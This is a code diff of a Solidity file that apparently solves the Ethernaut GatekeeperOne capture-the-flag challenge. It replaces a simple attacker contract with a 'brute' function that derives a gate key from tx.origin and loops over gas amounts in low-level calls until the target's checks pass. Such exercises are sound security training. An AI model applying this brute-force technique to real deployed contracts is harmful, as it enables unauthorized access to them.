@@ -43,7 +43,11 @@ library SafeMath {
      *
      * - Subtraction cannot overflow.
      */
-    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+    function sub(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
         require(b <= a, errorMessage);
         uint256 c = a - b;
 
@@ -102,7 +106,11 @@ library SafeMath {
      *
      * - The divisor cannot be zero.
      */
-    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+    function div(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
         require(b > 0, errorMessage);
         uint256 c = a / b;
         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
@@ -138,7 +146,11 @@ library SafeMath {
      *
      * - The divisor cannot be zero.
      */
-    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+    function mod(
+        uint256 a,
+        uint256 b,
+        string memory errorMessage
+    ) internal pure returns (uint256) {
         require(b != 0, errorMessage);
         return a % b;
     }
@@ -184,88 +196,42 @@ contract GatekeeperOne {
         entrant = tx.origin;
         return true;
     }
-
-    // function enter_gateOne(bytes8 _gateKey) public gateOne returns (bool) {
-    //     entrant = tx.origin;
-    //     return true;
-    // }
-
-    // function enter_gateTwo(bytes8 _gateKey)
-    //     public
-    //     gateOne
-    //     gateTwo
-    //     returns (bool)
-    // {
-    //     entrant = tx.origin;
-    //     return true;
-    // }
-
-    // function enter_gateThree(bytes8 _gateKey)
-    //     public
-    //     gateThree(_gateKey)
-    //     returns (bool)
-    // {
-    //     entrant = tx.origin;
-    //     return true;
-    // }
-
-    // function reset() public {
-    //     entrant = address(0);
-    // }
 }
 
 interface IGateKeeper {
     function enter(bytes8 _gateKey) external returns (bool);
 
-    function enter_gateOne(bytes8 _gateKey) external returns (bool);
-
-    function enter_gateTwo(bytes8 _gateKey) external returns (bool);
-
-    function enter_gateThree(bytes8 _gateKey) external returns (bool);
+    function entrant() external view returns (address);
 }
 
 contract GateOneAttacker {
+    uint256 public count = 0;
+    uint256 public finalGasPrice = 0;
     IGateKeeper public gatekeeper;
-    event GateEvent(bool success);
-
-    // uncomment debug function will change gas used.
-
-    // event DebugEvent64(uint64 msg);
-    // event DebugEvent32(uint32 msg);
-    // event DebugEvent16(uint16 msg);
 
     constructor(address targetGate) public {
         gatekeeper = IGateKeeper(targetGate);
     }
-
-    // function debug64(bytes8 _gateKey) public {
-    //     //28f936b205453adf
-    //     emit DebugEvent64(uint64(_gateKey));
-    //     //0000000000003adf
-    //     emit DebugEvent16(uint16(uint64(_gateKey)));
-    //     //0000000005453adf
-    //     emit DebugEvent32(uint32(uint64(_gateKey)));
-    //     //0000000000002266
-    //     emit DebugEvent16(uint16(uint160(tx.origin)));
-    // }
-
-    function tryEnter(bytes8 _gateKey) public {
-        bool success = gatekeeper.enter(_gateKey);
-        emit GateEvent(success);
+    function brute(uint loopRange) public {
+        require(gatekeeper.entrant() == address(0),"already cracked");
+        bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2**32);
+        uint256 startIndex = count * loopRange;
+        uint256 endIndex = (count + 1) * loopRange;
+        bytes memory encodedParams = abi.encodeWithSignature(
+            ("enter(bytes8)"),
+            key
+        );
+        for (uint256 i = startIndex; i < endIndex; i++) {
+            //actually it only 5k gas to beat the modifier. + 20k to store new variable to memory
+            // my bonker mine did not notice 20k gas to make function call transaction. So I add them up to 44k gas instead of 24k gas like in answer.
+            (bool success, ) = address(gatekeeper).call{gas: i + 44000}( 
+                encodedParams
+            );
+            if (success) {
+                finalGasPrice = i + 44000;
+                break;
+            }
+        }
+        count++;
     }
-
-    // function tryEnterGateOne(bytes8 _gateKey) public {
-    //     bool success = gatekeeper.enter_gateOne(_gateKey);
-    //     emit GateEvent(success);
-    // }
-
-    // function tryEnterGateTwo(bytes8 _gateKey) public {
-    //     bool success = gatekeeper.enter_gateTwo(_gateKey);
-    //     emit GateEvent(success);
-    // }
-
-    // function tryEnterGateThree(bytes8 _gateKey) public {
-    //     bool success = gatekeeper.enter_gateThree(_gateKey);
-    //     emit GateEvent(success);
-    // }
 }
